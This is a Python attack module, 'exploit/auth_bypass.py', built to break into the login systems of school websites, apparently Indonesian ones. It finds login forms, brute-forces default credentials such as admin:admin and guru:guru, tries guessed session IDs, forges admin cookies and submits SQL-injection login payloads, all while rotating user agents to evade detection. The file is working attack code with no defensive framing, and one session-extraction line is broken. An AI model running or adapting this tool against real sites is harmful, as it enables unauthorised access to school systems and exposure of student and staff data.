#!/usr/bin/env python3
# exploit/auth_bypass.py - Authentication Bypass Module
import requests
import re
import json
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class AuthBypass:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
    def random_headers(self):
        import random
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def find_login_pages(self, url):
        """Find login pages on school website"""
        login_pages = []
        login_keywords = [
            'login', 'signin', 'masuk', 'log in', 'sign in',
            'admin', 'administrator', 'guru', 'teacher',
            'siswa', 'student', 'akun', 'account',
            'auth', 'authentication', 'otentikasi'
        ]
        
        try:
            response = self.session.get(url, headers=self.random_headers(), timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms with password fields
            for form in soup.find_all('form'):
                has_password = False
                for input_tag in form.find_all('input'):
                    input_type = input_tag.get('type', '').lower()
                    if input_type == 'password':
                        has_password = True
                        break
                
                if has_password:
                    action = form.get('action', '')
                    if action:
                        login_url = urljoin(url, action)
                        login_pages.append({
                            'url': login_url,
                            'method': form.get('method', 'GET').upper(),
                            'inputs': self.get_form_inputs(form)
                        })
            
            # Find login links
            for link in soup.find_all('a', href=True):
                href = link['href'].lower()
                text = link.get_text().lower()
                
                if any(keyword in href or keyword in text for keyword in login_keywords):
                    login_url = urljoin(url, link['href'])
                    if login_url not in [p['url'] for p in login_pages]:
                        login_pages.append({
                            'url': login_url,
                            'method': 'GET',
                            'inputs': []
                        })
            
            return login_pages[:5]  # Limit to 5 pages
            
        except Exception as e:
            print(f"Error finding login pages: {e}")
            return []
    
    def get_form_inputs(self, form):
        """Extract input fields from form"""
        inputs = []
        for input_tag in form.find_all(['input', 'select', 'textarea']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', '')
            }
            inputs.append(input_data)
        return inputs
    
    def test_default_credentials(self, url, credentials_file='targets/default_credentials.txt'):
        """Test default credentials on login forms"""
        results = []
        
        # Load credentials
        credentials = self.load_credentials(credentials_file)
        login_pages = self.find_login_pages(url)
        
        if not login_pages:
            print("[!] No login pages found")
            return results
        
        print(f"[+] Found {len(login_pages)} login pages")
        print(f"[+] Testing {len(credentials)} credential pairs")
        
        for login_page in login_pages:
            print(f"\n[→] Testing: {login_page['url']}")
            
            for username, password in credentials[:20]:  # Limit to 20 for speed
                success = self.test_credential(login_page, username, password)
                
                if success:
                    result = {
                        'login_page': login_page['url'],
                        'username': username,
                        'password': password,
                        'status': 'SUCCESS'
                    }
                    results.append(result)
                    print(f"  [✓] {username}:{password} - SUCCESS")
                    
                    # Try to extract session data
                    session_info = self.extract_session_info(self.session)
                    if session_info:
                        result['session_info'] = session_info
                    
                    break  # Stop testing this page if success
                else:
                    print(f"  [✗] {username}:{password}")
                
                time.sleep(0.1)  # Small delay
        
        return results
    
    def load_credentials(self, filename):
        """Load credentials from file"""
        credentials = []
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            user, pwd = line.split(':', 1)
                            credentials.append((user.strip(), pwd.strip()))
        except:
            # Default credentials for schools
            credentials = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'admin'),
                ('guru', 'guru'),
                ('siswa', 'siswa'),
                ('kepsek', 'kepsek'),
                ('operator', 'operator'),
                ('superadmin', 'superadmin'),
                ('user', 'user')
            ]
        
        return credentials
    
    def test_credential(self, login_page, username, password):
        """Test a single credential pair"""
        try:
            if login_page['method'] == 'POST':
                # Prepare POST data
                data = {}
                for inp in login_page['inputs']:
                    name = inp['name']
                    if name:
                        if 'user' in name.lower() or 'name' in name.lower() or 'email' in name.lower():
                            data[name] = username
                        elif 'pass' in name.lower():
                            data[name] = password
                        else:
                            data[name] = inp.get('value', '')
                
                response = self.session.post(
                    login_page['url'],
                    data=data,
                    headers=self.random_headers(),
                    timeout=10,
                    allow_redirects=True
                )
            else:
                # GET request with parameters
                params = {}
                for inp in login_page['inputs']:
                    name = inp['name']
                    if name:
                        if 'user' in name.lower() or 'name' in name.lower():
                            params[name] = username
                        elif 'pass' in name.lower():
                            params[name] = password
                        else:
                            params[name] = inp.get('value', '')
                
                response = self.session.get(
                    login_page['url'],
                    params=params,
                    headers=self.random_headers(),
                    timeout=10,
                    allow_redirects=True
                )
            
            # Check for successful login indicators
            if self.is_login_successful(response):
                return True
            
            # Check for session cookies
            if self.session.cookies:
                cookie_names = [c.name for c in self.session.cookies]
                session_cookies = ['session', 'auth', 'token', 'login', 'user']
                if any(sc in ' '.join(cookie_names).lower() for sc in session_cookies):
                    return True
            
            return False
            
        except Exception as e:
            print(f"    Error testing credential: {e}")
            return False
    
    def is_login_successful(self, response):
        """Check if login was successful"""
        success_indicators = [
            'logout', 'log out', 'keluar',
            'dashboard', 'beranda', 'home',
            'welcome', 'selamat datang',
            'profile', 'profil',
            'admin panel', 'control panel'
        ]
        
        failure_indicators = [
            'invalid', 'salah', 'gagal',
            'error', 'failed', 'login failed',
            'wrong', 'incorrect'
        ]
        
        text_lower = response.text.lower()
        
        # Check for success indicators
        for indicator in success_indicators:
            if indicator in text_lower:
                return True
        
        # Check for absence of failure indicators
        for indicator in failure_indicators:
            if indicator in text_lower:
                return False
        
        # If redirected to different page (common on success)
        if len(response.history) > 0:
            final_url = response.url.lower()
            initial_url = response.history[0].url.lower()
            if final_url != initial_url and 'login' not in final_url:
                return True
        
        return False
    
    def extract_session_info(self, session):
        """Extract session information from successful login"""
        info = {
            'cookies': {},
            'headers': {},
            'session_data': {}
        }
        
        # Extract cookies
        for cookie in session.cookies:
            info['cookies'][cookie.name] = cookie.value
        
        # Check for common session patterns
        response = session.get(session.cookies, headers=self.random_headers(), timeout=5)
        if response.status_code == 200:
            # Look for user information in page
            user_patterns = [
                r'user[\'"]?\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'username[\'"]?\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'nama[\'"]?\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'email[\'"]?\s*[:=]\s*[\'"]([^\'"]+)[\'"]',
                r'id[\'"]?\s*[:=]\s*[\'"]([^\'"]+)[\'"]'
            ]
            
            for pattern in user_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    info['session_data']['user_info'] = matches[0]
                    break
        
        return info if info['cookies'] else None
    
    def session_hijack(self, url):
        """Attempt session hijacking via session fixation/prediction"""
        print(f"[+] Attempting session hijacking on {url}")
        
        # Method 1: Try common session IDs
        common_session_ids = [
            '123456', 'admin', 'administrator',
            'session123', 'token123', 'auth123',
            'PHPSESSID=1234567890abcdef',
            'ASP.NET_SessionId=1234567890',
            'JSESSIONID=1234567890'
        ]
        
        hijack_results = []
        
        for session_id in common_session_ids:
            headers = self.random_headers()
            headers['Cookie'] = session_id
            
            try:
                response = self.session.get(url, headers=headers, timeout=5)
                
                # Check if we got access
                if response.status_code == 200 and 'login' not in response.url.lower():
                    access_level = self.check_access_level(response.text)
                    hijack_results.append({
                        'session_id': session_id,
                        'access': access_level,
                        'success': True
                    })
                    print(f"  [✓] Session ID worked: {session_id[:20]}...")
                else:
                    hijack_results.append({
                        'session_id': session_id,
                        'success': False
                    })
                    
            except Exception as e:
                hijack_results.append({
                    'session_id': session_id,
                    'error': str(e),
                    'success': False
                })
        
        # Method 2: Try to predict session patterns
        print("[+] Analyzing session patterns...")
        pattern_result = self.analyze_session_patterns(url)
        if pattern_result:
            hijack_results.append(pattern_result)
        
        return hijack_results
    
    def analyze_session_patterns(self, url):
        """Analyze session ID patterns for prediction"""
        try:
            # Make multiple requests to collect session samples
            samples = []
            for _ in range(3):
                response = self.session.get(url, headers=self.random_headers(), timeout=5)
                if 'Set-Cookie' in response.headers:
                    cookies = response.headers['Set-Cookie']
                    samples.append(cookies)
                time.sleep(1)
            
            if samples:
                # Analyze patterns
                analysis = {
                    'sample_count': len(samples),
                    'cookie_present': True,
                    'pattern_analysis': 'Session cookies detected'
                }
                
                # Check for predictable patterns
                if len(samples) >= 2:
                    # Compare samples for incremental patterns
                    analysis['prediction_possible'] = self.check_predictable_pattern(samples)
                
                return analysis
            
        except Exception as e:
            return {'error': str(e)}
        
        return None
    
    def check_predictable_pattern(self, samples):
        """Check if session IDs follow predictable patterns"""
        # Simplified pattern checking
        # In real implementation, would analyze for:
        # - Incremental numbers
        # - Time-based patterns  
        # - Hash patterns
        return False
    
    def check_access_level(self, html_content):
        """Check access level from page content"""
        html_lower = html_content.lower()
        
        if 'admin' in html_lower or 'administrator' in html_lower:
            return 'admin'
        elif 'guru' in html_lower or 'teacher' in html_lower:
            return 'teacher'
        elif 'siswa' in html_lower or 'student' in html_lower:
            return 'student'
        else:
            return 'unknown'
    
    def cookie_manipulation(self, url):
        """Manipulate cookies for authentication bypass"""
        print(f"[+] Attempting cookie manipulation on {url}")
        
        manipulation_results = []
        
        # Common cookie manipulation techniques
        manipulations = [
            # 1. Change cookie values to admin
            {'name': 'user', 'value': 'admin'},
            {'name': 'role', 'value': 'admin'},
            {'name': 'type', 'value': 'administrator'},
            {'name': 'level', 'value': '999'},
            
            # 2. Boolean flags
            {'name': 'is_admin', 'value': 'true'},
            {'name': 'admin', 'value': '1'},
            {'name': 'authenticated', 'value': 'true'},
            
            # 3. School-specific
            {'name': 'user_type', 'value': 'guru'},
            {'name': 'hak_akses', 'value': 'admin'},
            {'name': 'tipe_user', 'value': 'administrator'}
        ]
        
        # First, get current cookies
        try:
            response = self.session.get(url, headers=self.random_headers(), timeout=5)
            original_cookies = dict(self.session.cookies)
            
            for manipulation in manipulations:
                # Create manipulated cookie jar
                self.session.cookies.clear()
                
                # Set original cookies
                for name, value in original_cookies.items():
                    self.session.cookies.set(name, value)
                
                # Add/override with manipulated cookie
                self.session.cookies.set(manipulation['name'], manipulation['value'])
                
                # Test access
                test_response = self.session.get(url, headers=self.random_headers(), timeout=5)
                
                result = {
                    'cookie_name': manipulation['name'],
                    'cookie_value': manipulation['value'],
                    'status_code': test_response.status_code,
                    'success': False
                }
                
                # Check if manipulation worked
                if test_response.status_code == 200:
                    if self.is_admin_page(test_response.text):
                        result['success'] = True
                        result['access_level'] = 'admin'
                    elif 'login' not in test_response.url.lower():
                        result['success'] = True
                        result['access_level'] = 'authenticated'
                
                manipulation_results.append(result)
                
                if result['success']:
                    print(f"  [✓] Cookie {manipulation['name']}={manipulation['value']} - SUCCESS")
                else:
                    print(f"  [✗] Cookie {manipulation['name']}={manipulation['value']}")
                
                time.sleep(0.5)
            
        except Exception as e:
            print(f"  [!] Cookie manipulation error: {e}")
        
        return manipulation_results
    
    def is_admin_page(self, html_content):
        """Check if page is admin panel"""
        admin_indicators = [
            'admin panel', 'control panel', 'dashboard',
            'manage', 'pengaturan', 'settings',
            'user management', 'kelola pengguna',
            'database', 'backup', 'log'
        ]
        
        html_lower = html_content.lower()
        return any(indicator in html_lower for indicator in admin_indicators)
    
    def sql_auth_bypass(self, url, login_page):
        """SQL injection authentication bypass"""
        print(f"[+] Attempting SQL injection auth bypass on {login_page['url']}")
        
        sql_payloads = [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin' --",
            "' OR 'a'='a",
            "' OR ''='",
            "' OR 1=1 LIMIT 1 --"
        ]
        
        bypass_results = []
        
        for payload in sql_payloads:
            # Test with common username/password combos
            test_cases = [
                {'username': payload, 'password': 'anything'},
                {'username': 'admin', 'password': payload},
                {'username': payload, 'password': payload}
            ]
            
            for test_case in test_cases:
                success = self.test_sql_bypass(login_page, test_case['username'], test_case['password'])
                
                if success:
                    result = {
                        'login_page': login_page['url'],
                        'payload': payload,
                        'username': test_case['username'],
                        'password': test_case['password'],
                        'success': True
                    }
                    bypass_results.append(result)
                    print(f"  [✓] SQL Bypass: {payload[:30]}...")
                    break
            
            if any(r['success'] for r in bypass_results):
                break
        
        return bypass_results
    
    def test_sql_bypass(self, login_page, username, password):
        """Test SQL injection bypass"""
        try:
            if login_page['method'] == 'POST':
                data = {}
                for inp in login_page['inputs']:
                    name = inp['name']
                    if name:
                        if 'user' in name.lower():
                            data[name] = username
                        elif 'pass' in name.lower():
                            data[name] = password
                        else:
                            data[name] = inp.get('value', '')
                
                response = self.session.post(
                    login_page['url'],
                    data=data,
                    headers=self.random_headers(),
                    timeout=10,
                    allow_redirects=True
                )
            else:
                params = {}
                for inp in login_page['inputs']:
                    name = inp['name']
                    if name:
                        if 'user' in name.lower():
                            params[name] = username
                        elif 'pass' in name.lower():
                            params[name] = password
                        else:
                            params[name] = inp.get('value', '')
                
                response = self.session.get(
                    login_page['url'],
                    params=params,
                    headers=self.random_headers(),
                    timeout=10,
                    allow_redirects=True
                )
            
            return self.is_login_successful(response)
            
        except Exception as e:
            return False

# Example usage
if __name__ == "__main__":
    bypass = AuthBypass()
    url = "http://example.school.edu"
    
    # Find login pages
    login_pages = bypass.find_login_pages(url)
    print(f"Found {len(login_pages)} login pages")
    
    # Test default credentials
    results = bypass.test_default_credentials(url)
    print(f"Successful logins: {len([r for r in results if r['status'] == 'SUCCESS'])}")
